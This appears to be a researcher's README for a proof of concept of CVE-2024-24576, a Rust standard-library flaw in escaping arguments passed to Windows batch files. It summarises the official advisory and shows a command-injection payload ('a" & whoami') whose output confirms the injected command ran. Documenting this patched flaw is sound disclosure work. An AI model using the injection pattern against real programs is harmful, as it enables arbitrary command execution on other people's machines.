# CVE-2024-24576
*NOT MY FINDING*  
I'm just a researcher.
## Overview
[Details](https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html)

The Command::arg and Command::args APIs state in their documentation that the arguments will be passed to the spawned process as-is, regardless of the content of the arguments, and will not be evaluated by a shell. This means it should be safe to pass untrusted input as an argument.

On Windows, the implementation of this is more complex than other platforms, because the Windows API only provides a single string containing all the arguments to the spawned process, and it's up to the spawned process to split them. Most programs use the standard C run-time argv, which in practice results in a mostly consistent way arguments are splitted.

One exception though is cmd.exe (used among other things to execute batch files), which has its own argument splitting logic. That forces the standard library to implement custom escaping for arguments passed to batch files. Unfortunately it was reported that our escaping logic was not thorough enough, and it was possible to pass malicious arguments that would result in arbitrary shell execution.

## Proof Of Concept
1. Switch Rust version to 1.76.0
```bash
rustup default 1.76.0
```

2. Run `cargo run` in `cmd.exe`
```
C:\Users\tester>cargo run

Enter payload:
a" & whoami

Output:
Argument received: "a\"
desktop-...\tester
```

3. If you getting `error: process didn't exit successfully:...`  
Copy `arg.bat` to `target\debug\CVE-2024-24576\`.  
Then try again.

## References
1. https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main
2. https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html
3. https://nvd.nist.gov/vuln/detail/CVE-2024-24576
